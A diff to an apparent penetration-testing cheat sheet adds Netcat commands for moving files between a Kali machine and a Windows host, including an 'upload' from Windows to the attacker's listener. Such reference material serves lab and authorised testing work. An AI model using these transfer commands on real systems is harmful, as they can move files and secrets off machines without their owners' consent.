@@ -761,6 +761,20 @@ $ echo <base64_string> | base64 -d > hosts
 $ md5sum hosts 
 ```
 
+- Netcat Downloads (Kali -> Windows)
+
+```
+$ nc -nlvp 443 < file.txt
+C:\> nc.exe -nv <IP address> 443 > file.txt
+```
+
+- Netcat Uploads (Windows -> Kali)
+
+```
+C:\> nc.exe -nlvp 443 < file.txt
+$ nc -nv <IP address> 443 > file.txt
+```
+
 - PowerShell DownloadFile (Kali -> Windows)
 
 ```
